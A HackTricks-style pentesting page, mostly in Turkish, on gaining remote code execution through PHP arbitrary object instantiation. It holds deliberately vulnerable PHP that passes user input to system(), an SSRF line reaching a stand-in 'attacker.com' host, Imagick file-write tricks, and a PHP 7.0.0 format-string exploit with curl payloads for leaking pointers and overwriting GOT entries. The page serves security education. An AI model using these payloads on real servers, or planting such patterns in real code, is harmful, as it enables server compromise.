# PHP - RCE abusing object creation: new $_GET["a"]($_GET["b"])

{{#include ../../../banners/hacktricks-training.md}}

This is basically a summary of [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

## Giriş

new sorgusuna benzer keyfi nesnelerin oluşturulması, örneğin `new $_GET["a"]($_GET["a"])`, Remote Code Execution (RCE)'ye yol açabilir; detaylar bir [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) içinde ele alınmıştır. Bu doküman RCE elde etmek için çeşitli stratejileri öne çıkarır.

## RCE via Custom Classes or Autoloading

`new $a($b)` sözdizimi, bir nesne oluşturmak için kullanılır; burada **`$a`** sınıf adını, **`$b`** ise konstruktöre geçirilen ilk argümanı temsil eder. Bu değişkenler GET/POST gibi kullanıcı girdilerinden gelebilir (string veya dizi olabilirler) veya JSON'dan geliyorlarsa farklı türlerde olabilirler.

Aşağıdaki kod parçasını inceleyin:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
Bu durumda, `$a`'yı `App` veya `App2`'ye ve `$b`'yi bir sistem komutuna (ör. `uname -a`) ayarlamak, o komutun çalıştırılmasına neden olur.

**Autoloading functions** doğrudan erişilebilir sınıflar yoksa istismar edilebilir. Bu fonksiyonlar ihtiyaç duyulduğunda sınıfları dosyalardan otomatik olarak yükler ve `spl_autoload_register` veya `__autoload` kullanılarak tanımlanır:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
Autoloading davranışı PHP sürümlerine göre değişir ve farklı RCE imkanları sunar.

## RCE aracılığıyla Yerleşik Sınıflar

Özel sınıflar veya autoloader'lar yoksa, **yerleşik PHP sınıfları** RCE için yeterli olabilir. Bu sınıfların sayısı PHP sürümüne ve eklentilere bağlı olarak 100 ila 200 arasında değişir. `get_declared_classes()` kullanılarak listelenebilirler.

İlgili constructor'lar reflection API kullanılarak tespit edilebilir, aşağıdaki örnekte ve şu linkte gösterildiği gibi: [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF).

**RCE via specific methods includes:**

### **SSRF + Phar Deserialization**

`SplFileObject` sınıfı constructor'ı üzerinden SSRF'ye izin verir, herhangi bir URL'ye bağlantılara olanak tanır:
```php
new SplFileObject('http://attacker.com/');
```
SSRF, Phar protocol kullanılarak PHP 8.0'dan önceki sürümlerde deserialization attacks'e yol açabilir.

### **Exploiting PDOs**

PDO class constructor, DSN strings aracılığıyla veritabanlarına bağlantılara izin verir, potansiyel olarak dosya oluşturma veya diğer etkileşimleri mümkün kılabilir:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

PHP'in 5.3.22 ve 5.4.12'ye kadar olan sürümleri, libxml2 sürümüne bağlı olarak `SoapClient` ve `SimpleXMLElement` yapıcıları aracılığıyla XXE saldırılarına açıktı.

## RCE via Imagick Extension

Bir **projenin bağımlılıklarının** analizinde, yeni nesneler oluşturularak **Imagick**'in **komut yürütme** için kullanılabileceği keşfedildi. Bu, zafiyetleri istismar etme fırsatı sunar.

### VID parser

VID parser'ın dosya sisteminde belirtilen herhangi bir yola içerik yazabilme yeteneği tespit edildi. Bu, web'den erişilebilir bir dizine bir PHP shell yerleştirilmesine ve Remote Code Execution (RCE) elde edilmesine yol açabilir.

#### VID Parser + File Upload

PHP'nin yüklenen dosyaları geçici olarak `/tmp/phpXXXXXX` içinde tuttuğu not edilmiştir. Imagick'teki VID parser, **msl** protokolünü kullanarak dosya yollarında wildcard'ları işleyebilir ve geçici dosyanın seçilen bir konuma aktarılmasını kolaylaştırır. Bu yöntem, dosya sistemi içinde keyfi dosya yazma sağlamak için ek bir yol sunar.

### PHP Crash + Brute Force

[**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)'da açıklanan bir yöntem, silinmeden önce sunucu çökmesine yol açan dosyaların yüklenmesini içerir. Geçici dosyanın adını brute-force ile tahmin ederek, Imagick'in keyfi PHP kodu çalıştırması mümkün olabilir. Ancak bu teknik yalnızca eski bir ImageMagick sürümünde etkili bulunmuştur.

## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)

Kullanıcı girdisi sınıf adını kontrol ettiğinde (ör. `new $_GET['model']()`), PHP 7.0.0 `Throwable` yeniden düzenlemesi sırasında geçici bir hata getirdi; motor sınıf adını çözümleme sırasında yanlışlıkla bir printf format stringi olarak ele aldı. Bu, PHP içinde klasik printf-tarzı ilkel işlemleri mümkün kılar: `%p` ile leaks, genişlik belirticileriyle yazma-sayısı kontrolü ve işlem içi pointer'lara (örneğin ELF derlemelerdeki GOT girdilerine) karşı `%n` ile rastgele yazmalar.

Minimal repro zafiyet deseni:
```php
<?php
$model = $_GET['model'];
$object = new $model();
```
İstismar özeti (kaynak referanstan):
- Sınıf adında `%p` kullanarak adresleri Leak ederek yazılabilir bir hedef bulun:
```bash
curl "http://host/index.php?model=%p-%p-%p"
# Fatal error includes resolved string with leaked pointers
```
- Tam bir byte sayısı ayarlamak için pozisyonel parametreler ve genişlik belirticileri kullanın, sonra `%n` ile bu değeri stack'te erişilebilir bir adrese yazın; hedef olarak bir GOT slotunu (ör. `free`) seçip kısmi overwrite ile `system`'e yönlendirin.
- Bir class adı içinde shell pipe bulunan bir değer geçirerek ele geçirilmiş fonksiyonu tetikleyin ve `system("id")`'ye ulaşın.

Notlar:
- Yalnızca PHP 7.0.0'da çalışır (Bug [#71105](https://bugs.php.net/bug.php?id=71105)); sonraki sürümlerde düzeltildi. Ciddiyet: eğer keyfi class instantiation mümkünse kritik.
- Tipik payload'lar stack'i gezmek için birçok `%p` zincirler, sonra kısmi overwrite'ı gerçekleştirmek için `%.<width>d%<pos>$n` kullanırlar.

## References

- [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../../banners/hacktricks-training.md}}
